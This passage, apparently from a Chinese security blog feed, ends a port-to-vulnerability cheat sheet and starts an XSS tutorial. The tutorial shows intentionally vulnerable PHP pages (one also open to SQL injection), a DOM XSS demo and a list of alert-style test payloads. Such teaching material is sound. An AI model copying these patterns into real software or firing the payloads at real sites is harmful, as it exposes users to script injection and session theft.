<strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">28退格漏洞</span><br><span class="line">OpenSSL漏洞</span><br><span class="line">用户名枚举</span><br></pre></td></tr></table></figure><h3 id="Telent"><a href="#Telent" class="headerlink" title="Telent"></a>Telent</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">23</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br></pre></td></tr></table></figure><h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3389</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>           </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">Shitf粘滞键后门</span><br><span class="line">缓冲区溢出</span><br><span class="line">MS12-020</span><br><span class="line">CVE-2019-0708</span><br></pre></td></tr></table></figure><h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5901</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong>      </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">认证口令绕过</span><br><span class="line">拒绝服务攻击-CVE-2015-5239</span><br><span class="line">权限提升-CVE-2013-6886</span><br></pre></td></tr></table></figure><h3 id="Pcanywhere"><a href="#Pcanywhere" class="headerlink" title="Pcanywhere"></a>Pcanywhere</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5632</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拒绝服务攻击</span><br><span class="line">权限提升</span><br><span class="line">代码执行</span><br></pre></td></tr></table></figure><h3 id="X11"><a href="#X11" class="headerlink" title="X11"></a>X11</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6000</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问-CVE-1999-0526</span><br></pre></td></tr></table></figure><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25/465</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">未经授权访问</span><br><span class="line">邮件伪造</span><br></pre></td></tr></table></figure><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110/995</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">未经授权访问</span><br></pre></td></tr></table></figure><h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">143/993</span><br></pre></td></tr></table></figure><p><strong>常见端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">任意文件读取</span><br></pre></td></tr></table></figure><h2 id="其他服务"><a href="#其他服务" class="headerlink" title="其他服务"></a>其他服务</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DNS区域传输</span><br><span class="line">DNS劫持</span><br><span class="line">DNS欺骗</span><br><span class="line">DNS缓存投毒</span><br><span class="line">DNS隧道</span><br></pre></td></tr></table></figure><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67/68</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DHCP劫持</span><br><span class="line">DHCP欺骗</span><br></pre></td></tr></table></figure><h3 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">161</span><br></pre></td></tr></table></figure><p>  <strong>常见漏洞</strong>             </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br></pre></td></tr></table></figure><h3 id="Rlogin"><a href="#Rlogin" class="headerlink" title="Rlogin"></a>Rlogin</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">512/513/514</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlogin登录</span><br></pre></td></tr></table></figure><h3 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">873</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br><span class="line">本地权限提升</span><br></pre></td></tr></table></figure><h3 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8069</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程命令执行</span><br></pre></td></tr></table></figure><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1090/1099</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA反序列化</span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p><strong>端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2375</span><br></pre></td></tr></table></figure><p><strong>常见漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未经授权访问</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一些常见的端口对应的服务以及可以利用的漏洞。&lt;/p&gt;
&lt;h2 id=&quot;web服务类&quot;&gt;&lt;a href=&quot;#web服务类&quot; class=&quot;headerlink&quot; title=&quot;web服务类&quot;&gt;&lt;/a&gt;web服务类&lt;/h2&gt;&lt;h3 id=&quot;Tomcat&quot;&gt;&lt;a href=&quot;#T</summary>
      
    
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS从0到1</title>
    <link href="http://lvpsectime.github.io/2020/04/27/XSS%E4%BB%8E0%E5%88%B01/"/>
    <id>http://lvpsectime.github.io/2020/04/27/XSS%E4%BB%8E0%E5%88%B01/</id>
    <published>2020-04-27T13:31:06.000Z</published>
    <updated>2020-05-02T12:27:46.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>XSS可能不如SQL注入、文件上传等漏洞能够直接得到较高权限，但是XSS的运用十分灵活，也会带来很大的危害：</p><ol><li>网络钓鱼</li><li>盗取cookie</li><li>劫持会话</li><li>强制弹出广告、刷流量</li><li>网页挂马</li><li>提升用户权限</li><li>配合其他漏洞，如CSRF</li><li>等等</li></ol><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p><p>反射型XSS：前端 –&gt; 后端 –&gt; 前端</p><p>存储型XSS：前端 –&gt; 后端 –&gt; 数据库 –&gt; 前端</p><p>DOM型XSS：前端</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有<strong>一次性</strong>。</p><p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;反射型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xss1&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$xss = $_GET[&#x27;xss1&#x27;];</span><br><span class="line">if($xss1 == null)&#123;</span><br><span class="line">echo $xss;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/.io//%E5%8F%8D%E5%B0%84.png" alt="反射"></p><p>在输入框中随便输入，发现可以输出出来。</p><p><img src="/.io//test.png" alt="test"></p><p>我们在输入框中插入HTML标签 <code>&lt;h1&gt;test&lt;/h1&gt;</code></p><p><img src="/.io//h1.png" alt="h1标签"></p><p>发现<code>&lt;h1&gt;&lt;/h1&gt;</code>并未输入，我们查看源代码</p><p><img src="/.io//%E6%BA%90%E4%BB%A3%E7%A0%811.png"></p><p>可以看出<code>&lt;h1&gt;&lt;/h1&gt;</code>标签被<code>HTML</code>执行了。我们在插入一段<code>HTML</code>代码测试一下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: orange; <span class="attribute">text-align</span>: center; &#125; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/.io//html.png"></p><p>发现我们输入的<code>html</code>代码确实被执行了。</p><p>我们再输入<code>js</code>脚本，<code>&lt;script&gt;&lt;/script&gt;</code></p><p><img src="/.io//script.png" alt="script"></p><p>这就是一种典型的反射型XSS，我们可以发现，我们输入恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发。不过我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p><p><a href="http://127.0.0.1/xss/index.php?xss1=%3Cscript%3Ealert(%22xss%22)%3C/script%3E">短连接生成</a></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p><p>反射型 访问我们构造的链接</p><p>存储型 访问原网站链接</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我们在本地创建一个<code>xss</code>数据库，里面新建一个<code>messages</code>表，用来存放用户的留言信息，有三个字段：<code>id</code>、<code>username</code>、<code>message</code>。<code>id</code>设为主键，并勾选<strong>自动递增</strong> 。</p><p>前端、后端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/*数据库信息配置*/</span><br><span class="line">$host = &quot;localhost&quot;;</span><br><span class="line">$port = &quot;3306&quot;;</span><br><span class="line">$user = &quot;root&quot;;</span><br><span class="line">$pwd = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;XSS&quot;;</span><br><span class="line">$conn = new mysqli($host, $user, $pwd, $dbname, $port);</span><br><span class="line"></span><br><span class="line">/*直接将留言插入到数据库中*/</span><br><span class="line">// if isset($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;message&#x27;])&#123;</span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$message = $_POST[&#x27;message&#x27;];</span><br><span class="line"></span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">$sql = &quot;insert into message(username, message) values (&#x27;&#123;$username&#125;&#x27;, &#x27;&#123;$message&#125;&#x27;)&quot;;</span><br><span class="line">if($conn-&gt;query($sql) === TRUE)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Error:&quot;.$sql.&quot;&lt;br&gt;&quot;.$conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*查询数据库中的留言*/</span><br><span class="line">$sql = &quot;select username, message from message&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">while($row = $result-&gt;fetch_assoc())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;用户名：&quot;. $row[&#x27;username&#x27;]. &quot;留言内容：&quot;. $row[&#x27;message&#x27;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p><p><img src="/.io//liuyan.png" alt="留言板"></p><p>我们先随便输入几条留言看看</p><p><img src="/.io//liuyan1.png"></p><p>查看一下数据库</p><p><img src="/.io//schema.png"></p><p>可以看到我们输入的数据已经插入到数据库中了。</p><p>那么我们能不能像上面一样，插入一些恶意代码呢？试一下</p><p>插入 <code>&lt;script&gt;alert(&quot;hacker xss&quot;)&lt;/script&gt;</code></p><p><img src="/.io//hackerxss.png"></p><p>我们插入的留言被执行了。看一下数据库，被插入到数据库中了。</p><p><img src="/.io//alert.png"></p><p>我们换个浏览器试一下</p><p><img src="/.io//alert2.png"></p><p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/cunchuxss.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p><code>HTML</code>代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>dom xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;id1&quot;</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom-input&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span>&gt;</span>这里会显示输入的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dom-input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;change()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;替换&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码很简单，存在JS函数<code>change()</code>，该函数通过<code>DOM</code>操作将元素<code>id1</code>(输出位置)的内容修改为元素<code>dom_input</code>(输入位置)的内容。</p><p>DOM型XSS程序只有<code>HTML</code>代码，并不存在服务器端代码，所以此程序并没有与服务器端进行交互。</p><p>构造如下语句：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://39.97.251.161/usr/uploads/2020/04/449512334.png&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/DOM</span> <span class="attr">XSS</span>/)/&gt;</span></span><br></pre></td></tr></table></figure><p>直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的<code>alert()</code>函数，来达到弹窗的效果。</p><h2 id="触发标签与属性"><a href="#触发标签与属性" class="headerlink" title="触发标签与属性"></a>触发标签与属性</h2><p><strong>通用总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>script</strong></p><p>通常触发方式</p><p><strong>a</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>img</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>div</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><h3 id="简单粗暴的测试payload"><a href="#简单粗暴的测试payload" class="headerlink" title="简单粗暴的测试payload"></a>简单粗暴的测试payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=prompt(1)&gt;</span><br><span class="line">&lt;table background=&quot;javascript:confirm(1)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;a href=&quot;javascript:confirm(1)&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascrip&amp;#116&amp;#58confirm(1)&quot;&gt;a&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤测试"><a href="#过滤测试" class="headerlink" title="过滤测试"></a>过滤测试</h3><p><strong>payload - 0</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zxcv%20script&lt;&gt;&quot;%27</span><br></pre></td></tr></table></figure><p><strong>payload - 1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>payload - 2</strong></p><p>观察是否存在大小写混淆绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 